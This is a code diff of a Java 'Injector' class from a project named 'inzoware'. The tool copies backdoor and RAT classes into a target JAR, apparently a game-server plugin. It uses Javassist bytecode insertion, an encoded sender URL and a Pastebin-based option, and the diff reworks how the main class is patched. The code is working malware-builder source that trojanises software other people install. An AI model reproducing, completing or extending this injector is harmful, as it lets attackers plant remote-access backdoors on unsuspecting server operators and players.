@@ -1,5 +1,6 @@
 package com.inzo.technologies.inzoware;
 
+import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtMethod;
@@ -11,7 +12,6 @@ import java.nio.file.*;
 import javassist.CannotCompileException;
 import javassist.CtField;
 import javassist.NotFoundException;
-
 
 public class Injector {
 
@@ -68,14 +68,13 @@ public class Injector {
 
 
         String name = (String) ("" + input.getFileName());
-        String mainClass = (String) (config.MainClass);
         String EncodedURL = (String) (config.encodedSenderURL);
         String HooksClass = "com.inzo.technologies.inzoware.hooks.Hooks374"; 
 
 
 
         if(!quiet)
-            System.out.println("[Injector] Found Jar name: " + name + "\n[Injector] Inputted main class: " + mainClass);
+            System.out.println("[Injector] Found Jar name: " + name );
 
         /*--- Copy Backdoor Code ---*/
 
@@ -141,59 +140,6 @@ public class Injector {
             return false;
         }
 
-        /*--- Insert bytecode into main class ---*/
-
-        try {
-            ClassPool pool = new ClassPool(ClassPool.getDefault());
-            pool.appendClassPath(orig);
-
-            //Get main class, and find onEnable method
-
-            if(!quiet)
-                System.out.println("[Injector] Injecting RAT Resources into class.");
-
-            CtClass cc = pool.get(mainClass);
-            CtMethod m = cc.getDeclaredMethod("init");
-
-            if(!quiet)
-            m.insertAfter("{ com.inzo.technologies.inzoware.utils.Client.Initialize(); }");
-                System.out.println("[Injector] 'Client.Initialize();'  Has Been Added");
-
-            //Write to temporary file
-            cc.writeFile(temp.toString());
-        }catch(Exception e){
-            if(!quiet) {
-                InjectorGUI.displayError("Unknown Javassist error.");
-                System.out.println("[Injector] Unknown Javassist error.");
-                e.printStackTrace();
-            }
-            return false;
-        }
-
-        /*--- Write new main class ---*/
-
-        if(!quiet)
-            System.out.println("[Injector] Writing main class.");
-        Path patchedFile        = null;
-        Path target             = null;
-
-        try {
-            //Write final patched file
-            patchedFile = Paths.get("temp/" + mainClass.replace(".", "/") + ".class");
-            target      = outStream.getPath("/" + mainClass.replace(".", "/") + ".class");
-
-            Files.copy(patchedFile, target, StandardCopyOption.REPLACE_EXISTING);
-            if(!quiet)
-                System.out.println("[Injector] Finished writing file: " + output.getFileName());
-        }catch(IOException e){
-            if(!quiet) {
-                System.out.println("[Injector] Unknown IO error when copying new main class.");
-                e.printStackTrace();
-            }
-            return false;
-        }
-
-
         if(config.pastebinurl){
                     ClassPool pool = ClassPool.getDefault();
                 try{
@@ -236,6 +182,8 @@ public class Injector {
 
         if(!quiet)
             System.out.println("[Injector] Writing main class.");
+        Path patchedFile        = null;
+        Path target             = null;
 
         try {
             //Write final patched file
@@ -261,12 +209,10 @@ public class Injector {
     public static class SimpleConfig {
         public boolean pastebinurl;
         public String encodedSenderURL;
-        public String MainClass;
 
         public SimpleConfig(boolean b1, String s1, String s2) {
             pastebinurl = b1;
             encodedSenderURL = s1;
-            MainClass = s2;
         }
     }
 
@@ -309,8 +255,7 @@ public class Injector {
             "com.inzo.technologies.inzoware.mc.parsers.util.MultipartForm",
             "com.inzo.technologies.inzoware.modules.Blink",
             "com.inzo.technologies.inzoware.utils.Client",      
-            "com.inzo.technologies.inzoware.utils.Client$1",      
-            "com.inzo.technologies.inzoware.utils.DupingUtils",
+            "com.inzo.technologies.inzoware.utils.Client$1",
             "com.inzo.technologies.inzoware.utils.InitUtils"                                                                  
     };
 }
